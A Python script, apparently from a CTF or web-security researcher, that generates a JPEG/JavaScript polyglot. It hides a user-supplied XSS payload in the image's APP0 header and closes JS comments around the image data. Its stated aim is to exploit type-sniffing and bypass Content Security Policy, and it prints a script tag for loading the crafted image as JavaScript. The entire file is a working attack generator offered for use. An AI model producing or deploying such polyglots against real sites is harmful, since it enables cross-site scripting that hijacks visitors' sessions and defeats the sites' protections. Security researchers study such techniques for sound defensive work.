# coding: utf-8
# -**- author: byc_404 -**-
import argparse

LENGTH = 1337
WIDTH = 1337

PAYLOAD = "alert(1337);"

MAGIC_HEADER = b'\xff\xd8'
PADDING = b'\x00'


def gen_header():
    """
    Default header. Marker: \xff\xe0
    :return: header with xss payload
    """
    buffer = b"\xff\xe0"
    # 0x09 0x3A is valid javascript, meanwhile it represents the length of this block
    # which is 2362, reducing the amount of padding.
    data = b'\x09\x3aJFIF/*'
    xss = b'*/=' + PAYLOAD + b'/*'
    padding_len = int.from_bytes(b'\x09\x3a', byteorder='big') - len(data) - len(xss)
    buffer += data
    buffer += padding_len * PADDING
    buffer += xss
    return buffer


def change_size(content: bytes, length, width):
    """
    customize the height and width
    :param content: your jpeg buffer
    :param length: LENGTH
    :param width:  WIDTH
    :return: image buffer
    """
    start = content.find(b'\xff\xc0')
    end = content.find(b'\xff\xc4')

    buffer = content[start: end]

    origin_len = buffer[5: 5 + 2]
    origin_width = buffer[7: 7 + 2]

    length_byte = int.to_bytes(length, 2, byteorder='big')
    width_byte = int.to_bytes(width, 2, byteorder='big')

    new_buf = buffer.replace(origin_len, length_byte).replace(origin_width, width_byte)
    return content.replace(buffer, new_buf)


def gen_file(content, outfile):
    """
    close the comment at the end of file
    :return: generated jpeg
    """
    rest = content[4 + header_len:]
    # prevent "*" char in your jpeg file from closing your comment
    rest = rest.replace(b'*/', b'*\x2a')
    # close the comment with "*/"
    rest = rest.replace(b'\xfb\x95\xff\xd9', b'\xfb\x95\x2a\x2f\x2f\x2f\xff\xd9')
    poc = MAGIC_HEADER + header + rest
    with open(outfile, 'wb') as f:
        f.write(poc)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Generate polyglot xss jpeg with your customized height and width'
                                                 'inorder to make use of type-sniffing and bypass CSP')
    parser.add_argument('input', help='Input file path')
    parser.add_argument('output', help='Output file path')
    parser.add_argument('payload', help='Your xss payload, alert(1); as default', default="alert(1);", type=str)
    parser.add_argument('--height', help='Height of your output jpeg, 337 as default', default=337, type=int)
    parser.add_argument('--width', help='Width of your output jpeg, 337 as default', default=337, type=int)

    args = parser.parse_args()

    PAYLOAD = args.payload.encode()
    try:
        with open(args.input, 'rb') as f:
            content = f.read()

        header_len = int.from_bytes(content[4: 4 + 2], byteorder='big')
        header = gen_header()
        content = change_size(content, args.height, args.width)
        gen_file(content, args.output)

        usage = 'Successfully Generated!\n'
        usage += 'Usage: '
        usage += '<script charset="ISO-8859-1" src="YOUR_OUTPUT_JPEG_PATH"></script>\n'
        print(usage)
    except Exception as e:
        print(str(e))
